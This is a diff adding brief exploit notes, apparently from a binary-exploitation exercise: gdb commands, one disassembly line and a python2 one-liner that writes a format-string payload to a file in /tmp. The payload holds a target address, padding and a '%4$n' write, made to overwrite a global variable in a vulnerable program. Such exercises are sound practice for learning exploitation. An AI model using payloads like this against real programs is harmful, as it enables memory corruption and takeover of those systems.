@@ -1,0 +1,7 @@
+disassemble v
+break *0x080484df
+set $eax=64
+
+  80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
+
+python2.7 -c 'print("\x8c\x98\x04\x08" + "a"*60 + "%4$n")' > /tmp/exploit.txt
